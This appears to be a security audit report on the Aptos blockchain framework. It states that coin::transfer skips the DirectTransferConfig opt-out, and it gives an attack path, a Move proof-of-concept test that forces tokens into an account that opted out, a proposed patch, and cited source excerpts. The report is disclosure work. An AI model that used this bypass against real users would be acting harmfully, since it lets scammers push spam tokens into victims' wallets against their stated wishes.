# Audit Report

## Title
DirectTransferConfig Bypass via coin::transfer Allowing Forced Token Deposits

## Summary
The `coin::transfer<CoinType>()` function bypasses the `DirectTransferConfig` security control that allows users to opt out of receiving arbitrary coin transfers. While `aptos_account::transfer_coins<CoinType>()` correctly enforces this protection, attackers can use the lower-level `coin::transfer<CoinType>()` to forcibly deposit unwanted tokens into accounts that have explicitly disabled direct coin transfers.

## Finding Description
Aptos provides a security feature (`DirectTransferConfig`) that allows users to opt out of receiving coins they haven't explicitly registered for by calling `set_allow_direct_coin_transfers(account, false)`. This is enforced in `aptos_account::deposit_coins()`. [1](#0-0) 

However, the `coin::transfer<CoinType>()` function provides an alternative transfer path that bypasses this check entirely: [2](#0-1) 

This function calls `primary_fungible_store::deposit()` which automatically creates the recipient's primary store without checking DirectTransferConfig: [3](#0-2) 

The SDK exposes both paths through different wrapper functions in `transaction_builder.rs`: [4](#0-3) 

Where `transfer()` ultimately calls `coin::transfer` via `aptos_stdlib::aptos_coin_transfer`: [5](#0-4) [6](#0-5) 

**Attack Path:**
1. User Alice calls `set_allow_direct_coin_transfers(false)` to opt out of receiving arbitrary tokens
2. Attacker creates MaliciousCoin and calls `coin::transfer<MaliciousCoin>(attacker, alice_address, amount)`
3. The transfer succeeds, creating Alice's primary fungible store and depositing MaliciousCoin
4. Alice now has unwanted MaliciousCoin despite explicitly opting out

## Impact Explanation
This qualifies as **Medium Severity** per Aptos bug bounty criteria as it represents a **state inconsistency requiring intervention** and violates user access control preferences. 

While this doesn't result in direct fund loss, it:
- Undermines a documented security control mechanism
- Allows spam/scam token attacks against protected users
- Could enable social engineering attacks where malicious tokens appear in victim wallets
- Breaks the security guarantee that users control their token exposure

## Likelihood Explanation
**Likelihood: High**

The attack is:
- Trivial to execute (single function call)
- Requires no special permissions
- Works against any user who has opted out of direct transfers
- Can be automated to target many users
- Already has SDK support making it easy for attackers to discover

The primary barrier is attacker awareness that `coin::transfer` exists as an alternative to `aptos_account::transfer_coins`.

## Recommendation
Add DirectTransferConfig enforcement to the primary fungible store deposit flow. Modify `primary_fungible_store::deposit()` to check the recipient's DirectTransferConfig before creating a new primary store for unregistered coin types:

```move
public fun deposit(owner: address, fa: FungibleAsset) acquires DeriveRefPod {
    let metadata = fa.asset_metadata();
    let store_addr = primary_store_address(owner, metadata);
    
    // NEW: Check DirectTransferConfig if creating new store
    if (!fungible_asset::store_exists(store_addr)) {
        // Check if this is a new coin type for the owner
        // and whether they allow arbitrary coin transfers
        if (exists<aptos_account::DirectTransferConfig>(owner)) {
            let config = borrow_global<aptos_account::DirectTransferConfig>(owner);
            assert!(
                config.allow_arbitrary_coin_transfers,
                error::permission_denied(EACCOUNT_DOES_NOT_ACCEPT_DIRECT_COIN_TRANSFERS)
            );
        }
    }
    
    let store = ensure_primary_store_exists(owner, metadata);
    dispatchable_fungible_asset::deposit(store, fa);
}
```

Alternatively, add the check in `ensure_primary_store_exists()` or require all coin transfers to go through the `aptos_account` module.

## Proof of Concept

```move
#[test(attacker = @0xBAD, victim = @0x123, framework = @0x1)]
fun test_direct_transfer_config_bypass(
    attacker: &signer, 
    victim: &signer,
    framework: &signer
) {
    use aptos_framework::aptos_account;
    use aptos_framework::coin;
    use std::signer;
    
    // Initialize test coin
    coin::create_coin_conversion_map(framework);
    let (burn_cap, freeze_cap, mint_cap) = coin::initialize<FakeCoin>(
        attacker,
        string::utf8(b"MaliciousCoin"),
        string::utf8(b"BAD"),
        8,
        false
    );
    
    // Setup accounts
    let victim_addr = signer::address_of(victim);
    aptos_account::create_account(victim_addr);
    coin::register<FakeCoin>(attacker);
    
    // Victim opts out of arbitrary coin transfers
    aptos_account::set_allow_direct_coin_transfers(victim, false);
    assert!(!aptos_account::can_receive_direct_coin_transfers(victim_addr), 1);
    
    // Mint malicious coins to attacker
    let coins = coin::mint<FakeCoin>(1000, &mint_cap);
    coin::deposit(signer::address_of(attacker), coins);
    
    // This SHOULD fail but DOESN'T - bypasses DirectTransferConfig
    coin::transfer<FakeCoin>(attacker, victim_addr, 100);
    
    // Victim now has unwanted coins despite opting out
    assert!(coin::balance<FakeCoin>(victim_addr) == 100, 2);
    
    // Cleanup
    coin::destroy_burn_cap(burn_cap);
    coin::destroy_freeze_cap(freeze_cap);
    coin::destroy_mint_cap(mint_cap);
}
```

This test demonstrates that `coin::transfer` successfully deposits tokens to a user who has explicitly opted out via DirectTransferConfig, proving the security control bypass.

### Citations

**File:** aptos-move/framework/aptos-framework/sources/aptos_account.move (L128-148)
```text
    public fun deposit_coins<CoinType>(
        to: address, coins: Coin<CoinType>
    ) acquires DirectTransferConfig {
        if (!account::exists_at(to)) {
            create_account(to);
            spec {
                // TODO(fa_migration)
                // assert coin::spec_is_account_registered<AptosCoin>(to);
                // assume aptos_std::type_info::type_of<CoinType>() == aptos_std::type_info::type_of<AptosCoin>() ==>
                //     coin::spec_is_account_registered<CoinType>(to);
            };
        };
        if (!coin::is_account_registered<CoinType>(to)) {
            assert!(
                can_receive_direct_coin_transfers(to),
                error::permission_denied(EACCOUNT_DOES_NOT_ACCEPT_DIRECT_COIN_TRANSFERS)
            );
            coin::register<CoinType>(&create_signer(to));
        };
        coin::deposit<CoinType>(to, coins)
    }
```

**File:** aptos-move/framework/aptos-framework/sources/coin.move (L1138-1146)
```text
    public entry fun transfer<CoinType>(
        from: &signer, to: address, amount: u64
    ) acquires CoinConversionMap, CoinInfo {
        let fa =
            primary_fungible_store::withdraw(
                from, ensure_paired_metadata<CoinType>(), amount
            );
        primary_fungible_store::deposit(to, fa);
    }
```

**File:** aptos-move/framework/aptos-framework/sources/primary_fungible_store.move (L194-199)
```text
    /// Deposit fungible asset `fa` to the given account's primary store.
    public fun deposit(owner: address, fa: FungibleAsset) acquires DeriveRefPod {
        let metadata = fa.asset_metadata();
        let store = ensure_primary_store_exists(owner, metadata);
        dispatchable_fungible_asset::deposit(store, fa);
    }
```

**File:** sdk/src/transaction_builder.rs (L247-253)
```rust
    pub fn transfer(&self, to: AccountAddress, amount: u64) -> TransactionBuilder {
        self.payload(aptos_stdlib::aptos_coin_transfer(to, amount))
    }

    pub fn account_transfer(&self, to: AccountAddress, amount: u64) -> TransactionBuilder {
        self.payload(aptos_stdlib::aptos_account_transfer(to, amount))
    }
```

**File:** aptos-move/framework/cached-packages/src/aptos_stdlib.rs (L19-21)
```rust
pub fn aptos_coin_transfer(to: AccountAddress, amount: u64) -> TransactionPayload {
    coin_transfer(AptosCoinType::type_tag(), to, amount)
}
```

**File:** aptos-move/framework/cached-packages/src/aptos_framework_sdk_builder.rs (L3032-3045)
```rust
pub fn coin_transfer(coin_type: TypeTag, to: AccountAddress, amount: u64) -> TransactionPayload {
    TransactionPayload::EntryFunction(EntryFunction::new(
        ModuleId::new(
            AccountAddress::new([
                0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
                0, 0, 0, 1,
            ]),
            ident_str!("coin").to_owned(),
        ),
        ident_str!("transfer").to_owned(),
        vec![coin_type],
        vec![bcs::to_bytes(&to).unwrap(), bcs::to_bytes(&amount).unwrap()],
    ))
}
```
